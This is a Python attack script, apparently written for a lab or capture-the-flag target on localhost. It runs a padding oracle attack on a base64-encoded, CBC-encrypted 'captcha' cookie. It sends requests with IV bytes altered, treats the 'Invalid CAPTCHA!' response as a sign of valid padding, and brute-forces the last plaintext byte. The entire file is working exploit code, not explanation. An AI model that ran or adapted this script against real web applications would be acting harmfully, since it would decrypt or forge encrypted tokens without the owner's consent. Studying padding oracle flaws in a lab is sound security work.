import base64
import requests
import time

# Configuration
base_url = "http://127.0.0.1:32834"
cookie_name = "captcha"
target_cookie = "2mArom13+gd4q/dQTQu4aFVpwOkejaqPtWuV0Kyn2ls="

# Decode the base64 cookie
cookie_bytes = base64.b64decode(target_cookie)
BLOCK_SIZE = 16
blocks = [cookie_bytes[i:i+BLOCK_SIZE] for i in range(0, len(cookie_bytes), BLOCK_SIZE)]

print(f"[+] Testing Padding Oracle Edge Cases")
print(f"[+] Target cookie: {target_cookie}")

def make_request(modified_cookie):
    """Make request with modified cookie"""
    try:
        session = requests.Session()
        session.cookies.set(cookie_name, modified_cookie)
        data = {'username': 'testuser', 'captcha': 'test', 'submit': 'Submit'}
        resp = session.post(base_url, data=data, timeout=10)
        return resp.text, resp.status_code
    except:
        return "Error", -1

def test_byte_combinations():
    """Test different byte combinations to understand the oracle"""
    print(f"\n[*] Testing byte combinations...")
    
    # Base cookie structure: [IV][Ciphertext]
    iv = bytearray(blocks[0])
    ciphertext = bytearray(blocks[1])
    
    # Try modifying each byte of IV to see what happens
    results = {}
    
    for byte_pos in range(16):
        print(f"\n[+] Testing IV byte position {byte_pos}")
        original_byte = iv[byte_pos]
        
        valid_count = 0
        invalid_count = 0
        
        # Test a subset of values to save time
        test_values = [0, 1, 0xFF, original_byte, (original_byte ^ 1)]
        
        for test_val in test_values:
            test_iv = bytearray(iv)
            test_iv[byte_pos] = test_val
            
            test_cookie = base64.b64encode(test_iv + ciphertext).decode()
            response, status = make_request(test_cookie)
            
            is_valid = "Invalid CAPTCHA!" in response
            
            if is_valid:
                valid_count += 1
            else:
                invalid_count += 1
            
            print(f"  IV[{byte_pos}] = 0x{test_val:02x}: {'VALID' if is_valid else 'INVALID'}")
        
        results[byte_pos] = {'valid': valid_count, 'invalid': invalid_count}
    
    return results

# Quick test of the oracle
print(f"[*] Testing padding oracle responses...")
resp1, status1 = make_request(target_cookie)
print(f"  Original: '{resp1[:50]}' ({status1})")

test_bad = bytearray(cookie_bytes)
test_bad[15] ^= 0xFF
resp2, status2 = make_request(base64.b64encode(test_bad).decode())
print(f"  Modified: '{resp2[:50]}' ({status2})")

# Test combinations
results = test_byte_combinations()
print(f"\n[+] Results summary:")
for pos, counts in results.items():
    print(f"  Position {pos:2d}: {counts['valid']} valid, {counts['invalid']} invalid")

print(f"\n[*] Manual test: Try to find valid padding for byte 15")
iv = bytearray(blocks[0])
ciphertext = bytearray(blocks[1])

# For byte 15, we're looking for padding value of 1
found_values = []
for guess in range(256):
    test_iv = bytearray(iv)
    # Set byte 15 to produce padding of 1: modified_iv[15] = iv[15] ^ guess ^ 1
    test_iv[15] = iv[15] ^ guess ^ 1
    
    test_cookie = base64.b64encode(test_iv + ciphertext).decode()
    response, status = make_request(test_cookie)
    
    if "Invalid CAPTCHA!" in response:
        found_values.append(guess)
        char = chr(guess) if 32 <= guess <= 126 else '.'
        print(f"  Found: guess=0x{guess:02x} '{char}'")
        break

if found_values:
    print(f"[+] Byte 15 decrypted value: 0x{found_values[0]:02x}")
else:
    print(f"[-] No valid value found for byte 15")
